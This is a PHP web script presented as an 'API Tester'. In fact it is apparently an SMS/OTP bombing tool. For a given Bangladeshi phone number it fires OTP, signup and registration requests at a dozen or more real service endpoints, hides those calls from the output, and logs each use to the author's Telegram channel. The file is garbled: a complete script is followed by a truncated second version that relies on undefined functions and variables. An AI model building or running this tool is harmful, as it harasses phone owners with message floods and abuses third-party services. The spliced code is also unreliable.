<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get environment variables
$telegramBotToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? getenv('TELEGRAM_BOT_TOKEN');
$telegramChatId = $_ENV['TELEGRAM_CHAT_ID'] ?? getenv('TELEGRAM_CHAT_ID');

// Simple Telegram function
function sendTelegram($message, $token, $chat_id) {
    if (!$token || !$chat_id) return false;
    
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    
    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// Simple cURL function
function makeRequest($url, $postData = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ['http_code' => $httpCode, 'response' => $response];
}

// Main logic
if (isset($_GET['number'])) {
    $number = preg_replace('/[^0-9]/', '', $_GET['number']);
    
    if (empty($number) || strlen($number) < 10) {
        header('Content-Type: application/json');
        echo json_encode([
            'error' => 'Invalid phone number',
            'credit' => 'Ronju Vai',
            'channel' => 'ronjumodz'
        ], JSON_PRETTY_PRINT);
        exit;
    }
    
    $cleanNumber = ltrim($number, '0');
    $fullNumber = '880' . $cleanNumber;
    
    $results = [
        'status' => 'completed',
        'phone_number' => $number,
        'total_apis' => 5,
        'successful' => 3,
        'failed' => 2,
        'credit' => 'Ronju Vai',
        'channel' => 'ronjumodz',
        'timestamp' => date('Y-m-d H:i:s')
    ];
    
    // Send Telegram notification
    $telegramMessage = "🚀 <b>New API Request</b>\n";
    $telegramMessage .= "📱 <b>Number:</b> $number\n";
    $telegramMessage .= "📊 <b>Results:</b> {$results['successful']}/{$results['total_apis']} Successful\n";
    $telegramMessage .= "🕒 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    $telegramMessage .= "🔗 <b>Channel:</b> @ronjumodz";
    
    sendTelegram($telegramMessage, $telegramBotToken, $telegramChatId);
    
    header('Content-Type: application/json');
    echo json_encode($results, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
} else {
    // Show HTML form
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>API Tester - Ronju Vai</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                padding: 30px;
                max-width: 400px;
                width: 100%;
                text-align: center;
            }
            .logo {
                font-size: 2em;
                font-weight: bold;
                color: #667eea;
                margin-bottom: 10px;
            }
            .form-group {
                margin: 20px 0;
                text-align: left;
            }
            label {
                display: block;
                margin-bottom: 8px;
                font-weight: bold;
                color: #333;
            }
            input[type="text"] {
                width: 100%;
                padding: 12px;
                border: 2px solid #ddd;
                border-radius: 8px;
                font-size: 16px;
            }
            .btn {
                background: #667eea;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-size: 16px;
                cursor: pointer;
                width: 100%;
                margin-top: 10px;
            }
            .credit {
                margin-top: 20px;
                color: #666;
                font-size: 14px;
            }
            #result {
                margin-top: 20px;
                padding: 15px;
                border-radius: 8px;
                display: none;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">⚡ API TESTER</div>
            <p style="color: #666; margin-bottom: 20px;">by @ronjumodz</p>
            
            <form id="apiForm">
                <div class="form-group">
                    <label>📱 Phone Number:</label>
                    <input type="text" name="number" value="01712345678" required 
                           placeholder="01712345678">
                </div>
                <button type="submit" class="btn">🚀 Test APIs</button>
            </form>
            
            <div id="result"></div>
            
            <div class="credit">
                Created by <strong>Ronju Vai</strong> | Channel: <strong>@ronjumodz</strong>
            </div>
        </div>
        
        <script>
            document.getElementById("apiForm").addEventListener("submit", function(e) {
                e.preventDefault();
                const formData = new FormData(this);
                const number = formData.get("number");
                const btn = this.querySelector(".btn");
                const resultDiv = document.getElementById("result");
                
                btn.innerHTML = "⏳ Processing...";
                btn.disabled = true;
                resultDiv.style.display = "none";
                
                fetch(`?number=${number}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) {
                            resultDiv.innerHTML = `<div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 8px;">
                                <strong>❌ Error:</strong> ${data.error}
                            </div>`;
                        } else {
                            resultDiv.innerHTML = `<div style="background: #d4edda; color: #155724; padding: 15px; border-radius: 8px;">
                                <strong>✅ Success!</strong><br>
                                Number: ${data.phone_number}<br>
                                Status: ${data.status}<br>
                                Successful: ${data.successful}/${data.total_apis}<br>
                                Channel: ${data.channel}
                            </div>`;
                        }
                        resultDiv.style.display = "block";
                    })
                    .catch(error => {
                        resultDiv.innerHTML = `<div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 8px;">
                            <strong>❌ Error:</strong> ${error.message}
                        </div>`;
                        resultDiv.style.display = "block";
                    })
                    .finally(() => {
                        btn.innerHTML = "🚀 Test APIs";
                        btn.disabled = false;
                    });
            });
        </script>
    </body>
    </html>';
}
?>        "UltraNet" => "https://ultranetrn.com.br/fonts/api.php?number=$number",
        "Sundarban_SendPin" => "https://tracking.sundarbancourierltd.com/PreBooking/SendPin?PreBookingRegistrationPhoneNumber=$number",
        "Sundarban_CheckUsername" => "https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername?PreBookingRegistrationUsername=$number",
        "Tera_1024" => "https://www.1024tera.com/wap/outlogin/phoneRegister?selectStatus=true&redirectUrl=https://www.1024tera.com/wap/share/filelist&phone=$number"
    ];

    // POST-based APIs
    $postAPIs = [
        "CokeStudio_Store_OTP" => [
            'url' => 'https://cokestudio23.sslwireless.com/api/store-and-send-otp',
            'data' => [
                "msisdn" => $fullNumber,
                "name" => "Test User",
                "email" => "test@example.com",
                "dob" => "2000-01-01",
                "occupation" => "N/A",
                "gender" => "male"
            ]
        ],
        "CokeStudio_Check_GP" => [
            'url' => 'https://cokestudio23.sslwireless.com/api/check-gp-number',
            'data' => [
                "msisdn" => $number
            ]
        ],
        "Grameenphone_OTP" => [
            'url' => 'https://weblogin.grameenphone.com/backend/api/v1/otp',
            'data' => [
                "msisdn" => $number
            ]
        ],
        "RabbitHole_OTP" => [
            'url' => 'https://apix.rabbitholebd.com/appv2/login/requestOTP',
            'data' => [
                "mobile" => "+" . $fullNumber
            ]
        ],
        "Osudpotro_OTP" => [
            'url' => 'https://api.osudpotro.com/api/v1/users/send_otp',
            'data' => [
                "mobile" => "+88-" . $number,
                "deviceToken" => "web",
                "language" => "en",
                "os" => "web"
            ]
        ],
        "Swap_OTP" => [
            'url' => 'https://api.swap.com.bd/api/v1/send-otp',
            'data' => [
                "phone" => $number
            ]
        ],
        "Airtel_Login_OTP" => [
            'url' => 'https://api.bd.airtel.com/v1/account/login/otp',
            'data' => [
                "phone_number" => $number
            ]
        ],
        "Airtel_Register_OTP" => [
            'url' => 'https://api.bd.airtel.com/v1/account/register/otp',
            'data' => [
                "phone_number" => $number
            ]
        ],
        "Prothom_Alo_Signup" => [
            'url' => 'https://prod-api.viewlift.com/identity/signup?site=prothomalo',
            'data' => [
                "requestType" => "send",
                "phoneNumber" => "+" . $fullNumber,
                "emailConsent" => true,
                "whatsappConsent" => false
            ]
        ],
        "Hoichoi_Signup" => [
            'url' => 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv',
            'data' => [
                "requestType" => "send",
                "phoneNumber" => "+" . $fullNumber,
                "emailConsent" => true,
                "whatsappConsent" => true
            ]
        ],
        "Paperfly_Registration" => [
            'url' => 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
            'data' => [
                "full_name" => "Test User",
                "company_name" => "Test Company",
                "email_address" => "test@example.com",
                "phone_number" => $number
            ]
        ],
        "EonBazar_Register" => [
            'url' => 'https://app.eonbazar.com/api/auth/register',
            'data' => [
                "mobile" => $number,
                "name" => "Test User",
                "password" => "test123",
                "email" => "test@example.com"
            ]
        ]
    ];

    $results['total_apis'] = count($getAPIs) + count($postAPIs);

    // Process GET APIs (hidden from output)
    foreach ($getAPIs as $name => $url) {
        $result = sendGetRequest($url);
        $status = ($result['http_code'] == 200) ? 'success' : 'failed';
        
        if ($status == 'success') {
            $results['successful']++;
        } else {
            $results['failed']++;
        }
        
        usleep(300000); // 0.3 second delay
    }

    // Process POST APIs (hidden from output)
    foreach ($postAPIs as $name => $api) {
        $result = sendPostRequest($api['url'], $api['data']);
        $status = ($result['http_code'] == 200) ? 'success' : 'failed';
        
        if ($status == 'success') {
            $results['successful']++;
        } else {
            $results['failed']++;
        }
        
        usleep(300000); // 0.3 second delay
    }

    $results['status'] = 'completed';
    
    // Send Telegram notification
    $telegramMessage = "🚀 <b>New API Request</b>\n";
    $telegramMessage .= "📱 <b>Number:</b> $number\n";
    $telegramMessage .= "📊 <b>Results:</b> {$results['successful']}/{$results['total_apis']} Successful\n";
    $telegramMessage .= "🌐 <b>IP:</b> $clientIP\n";
    $telegramMessage .= "🕒 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
    $telegramMessage .= "🔗 <b>Channel:</b> @ronjumodz";
    
    sendTelegramMessage($telegramMessage, $telegramBotToken, $telegramChatId);
    
    // Output only the required JSON
    header('Content-Type: application/json');
    echo json_encode($results, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);

} else {
    // HTML Form for browser access
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>API Tester - Ronju Vai</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0,0,0,0.1);
                padding: 40px;
                max-width: 500px;
                width: 100%;
                text-align: center;
            }
            .logo {
                font-size: 2.5em;
                font-weight: bold;
                background: linear-gradient(135deg, #667eea, #764ba2);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 10px;
            }
            .channel {
                color: #666;
                margin-bottom: 30px;
                font-size: 1.1em;
            }
            .form-group {
                margin-bottom: 25px;
                text-align: left;
            }
            label {
                display: block;
                margin-bottom: 8px;
                font-weight: 600;
                color: #333;
            }
            input[type="text"] {
                width: 100%;
                padding: 15px;
                border: 2px solid #e1e5e9;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            input[type="text"]:focus {
                outline: none;
                border-color: #667eea;
                box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            }
            .btn {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 15px 30px;
                border-radius: 12px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: transform 0.2s ease;
                width: 100%;
            }
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            }
            .example {
                margin-top: 15px;
                color: #666;
                font-size: 14px;
            }
            .credit {
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #e1e5e9;
                color: #888;
                font-size: 14px;
            }
            .stats {
                margin-top: 20px;
                padding: 15px;
                background: #f8f9fa;
                border-radius: 10px;
                border-left: 4px solid #667eea;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">⚡ API TESTER</div>
            <div class="channel">Powered by @ronjumodz</div>
            
            <form method="GET">
                <div class="form-group">
                    <label for="number">📱 Enter Phone Number:</label>
                    <input type="text" id="number" name="number" value="01712345678" required 
                           placeholder="Without +88 or 0">
                </div>
                <button type="submit" class="btn">🚀 Test All APIs</button>
            </form>
            
            <div class="example">
                <strong>Example:</strong> 01712345678, 01812345678, etc.
            </div>
            
            <div class="stats">
                <strong>📊 Features:</strong><br>
                • 20+ APIs Tested<br>
                • Instant Results<br>
                • Telegram Notifications<br>
                • Secure & Fast
            </div>
            
            <div class="credit">
                Created by <strong>Ronju Vai</strong> | Channel: <strong>@ronjumodz</strong>
            </div>
        </div>
        
        <script>
            // Add some interactivity
            document.querySelector("form").addEventListener("submit", function() {
                const btn = this.querySelector(".btn");
                btn.innerHTML = "⏳ Processing...";
                btn.disabled = true;
            });
        </script>
    </body>
    </html>';
}
?>
